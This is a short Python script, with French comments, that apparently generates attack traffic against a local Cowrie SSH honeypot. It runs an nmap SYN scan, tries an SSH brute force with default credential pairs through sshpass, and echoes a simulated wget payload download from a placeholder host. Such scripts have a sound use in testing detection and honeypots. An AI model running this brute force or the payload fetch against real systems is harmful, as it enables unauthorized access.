#!/usr/bin/env python3
import subprocess, logging, time, os

os.makedirs("logs", exist_ok=True)
logging.basicConfig(filename='logs/pentest.log', level=logging.INFO,
                    format='%(asctime)s %(levelname)s: %(message)s')

TARGET = "127.0.0.1"   # si host; si docker service, mettre 'cowrie'
SSH_PORT = 2222

def run_cmd(cmd, timeout=30):
    logging.info(f"RUN: {cmd}")
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        logging.info(p.stdout.strip())
        if p.stderr:
            logging.warning(p.stderr.strip())
        return p.returncode, p.stdout + p.stderr
    except Exception as e:
        logging.exception("Erreur commande")
        return -1, str(e)

def syn_scan():
    run_cmd(f"nmap -sS -p {SSH_PORT} --min-rate 200 {TARGET}")

def ssh_bruteforce():
    users = ["root","admin","user"]
    passwords = ["1234","password","toor"]
    for u in users:
        for p in passwords:
            cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p {SSH_PORT} {u}@{TARGET} echo OK"
            rc, out = run_cmd(cmd, timeout=10)
            if rc == 0 and "OK" in out:
                logging.info(f"Successful login {u}/{p}")
                return

def payload_detectable():
    # essaye une commande 'wget' simulée (ne télécharge pas de vrai payload)
    run_cmd(f"ssh -p {SSH_PORT} root@{TARGET} 'echo wget http://example.invalid/payload || true'")

def main():
    logging.info("=== Début pentest automatisé ===")
    syn_scan()
    time.sleep(2)
    ssh_bruteforce()
    time.sleep(1)
    payload_detectable()
    logging.info("=== Fin pentest automatisé ===")

if __name__ == "__main__":
    main()
